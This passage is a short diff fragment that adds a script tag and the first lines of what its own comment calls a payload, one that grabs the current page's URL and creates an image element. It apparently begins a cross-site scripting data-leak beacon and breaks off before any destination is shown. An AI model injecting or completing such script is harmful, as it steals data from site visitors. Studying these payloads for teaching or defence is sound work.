@@ -1,3 +1,4 @@
+<script>
 // our payload grabs the URL value of
 // the current page
   var img = document.createElement("img");
